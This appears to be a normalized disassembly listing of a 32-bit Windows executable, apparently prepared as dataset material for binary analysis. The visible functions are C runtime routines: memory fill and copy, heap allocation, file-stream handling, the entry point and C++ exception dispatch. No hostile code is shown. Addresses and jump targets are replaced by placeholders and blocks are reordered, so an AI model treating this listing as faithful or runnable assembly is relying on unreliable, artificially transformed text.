mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
pop esi
jae r-xdata
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
retn
push edx
call sub_406826
add eax 0x10
push eax
push [ rw-data ]
call sub_406586
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
retn
sub_404391
push 0x80
call sub_4044f2
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_404de5
mov eax [ rw-data ]
pop ecx
sub_4043c0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_40445d
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_406a8c
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fptan
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ rw-data ]
mov eax 0x1
fld [ r--data ]
fxch st1
fstp st0
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x20
lea ecx [ rw-data ]
call sub_406c07
pop edx
retn
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fptan
fstp st0
jmp r-xdata
mov edx 0x20
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_406c07
pop edx
retn
sub_404504
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_404530
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_406c43
test eax eax
pop ecx
jne r-xdata
sub_404530
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_4071cc
test eax eax
pop ecx
je r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
pop esi
retn
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov eax esi
shr eax 0x4
push eax
call sub_407c6f
test eax eax
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
pop esi
retn
jmp r-xdata
sub_4045af
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_40815d
push esi
mov edi eax
call sub_4080f7
push [ esi + 0x10 ]
call sub_408044
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_405bdc
and [ esi + 0x1c ] 0x0
pop ecx
sub_404605
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40822f
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_408308
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_404860
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_404720
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_4086e6
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_405c45
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_404780
push ebp
mov ebp esp
sub esp 0xcc
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x16 ]
cmp ax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0xcc ]
push eax
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp - 0x18 ]
cmp ax [ rw-data ]
jne r-xdata
or eax 0xffffffff
cmp eax 0x2
jne r-xdata
mov ax [ ebp - 0x1a ]
cmp ax [ rw-data ]
jne r-xdata
leave
retn
mov [ ecx ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x32 ] 0x0
je r-xdata
mov ax [ ebp - 0x1e ]
cmp ax [ rw-data ]
jne r-xdata
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ rw-data ] eax
pop esi
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ax [ ebp - 0x20 ]
cmp ax [ rw-data ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
call sub_408f40
mov ecx [ ebp + 0x8 ]
add esp 0x1c
test ecx ecx
je r-xdata
sub_404860
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4048c0 ]
jmp [ ecx * 4 + jump_table_40493c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4049a8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4049a8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_404b40 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_404a48 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404b40 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4049a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4049a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4049a8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_404b40 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404b40 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404b40 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404b40 ]
sub_404be4
push edi
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_404c7d
pop ecx
pop ecx
test ebx ebx
pop ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
push rw-data
push rw-data
call sub_404c7d
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_404c97
push ebx
push esi
mov esi rw-data
push edi
push esi
call sub_409002
mov edi eax
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x18 ]
push esi
call sub_4086e6
push esi
push edi
mov ebx eax
call sub_40908f
add esp 0x18
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404cc8
push ebp
mov ebp esp
add esp 0xfffffff4
fwait
fnstcw [ ebp - 0x2 ]
fwait
mov ax [ ebp - 0x2 ]
or ah 0xc
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
leave
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
xor esi esi
push esi
call sub_406dd3
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
call sub_409946
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_409814
mov [ rw-data ] eax
call sub_4095c7
call sub_40950e
call sub_404b95
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_4094b6
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x1c
call sub_404e0a
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401cdd
mov [ ebp - 0x60 ] eax
push eax
call sub_404bc2
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_409332
pop ecx
pop ecx
retn
sub_404e2e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_4056d2
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_404ec9
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_405175
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_404ec9
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_4056d2
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40567c
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_405070
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4040a1
add esp 0x14
mov ebx eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_409dc4
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_4056d2
push 0x1
push esi
call sub_40559e
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_405118
add esp 0xc
test eax eax
jne r-xdata
call sub_4056d2
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_405229
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_405070
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4040a1
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403f78
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405229
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_405118
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_409e20
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_405175
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_4056d2
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_405630
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_405229
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_4053da
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_403e38
call sub_403e7a
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_405175
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_4052a4
add esp 0x2c
test eax eax
je r-xdata
sub_4052a4
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_403eff
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_40536a
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40536a
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
cmp [ ebp - 0x2c ] ebx
je r-xdata
call sub_404216
push eax
push edi
call sub_40559e
pop ecx
pop ecx
sub_4053b0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_4053da
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_409dc4
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_409dc4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4056d2
push 0x1
push edi
call sub_409de0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_409dc4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_409dc4
pop ecx
pop ecx
test eax eax
je r-xdata
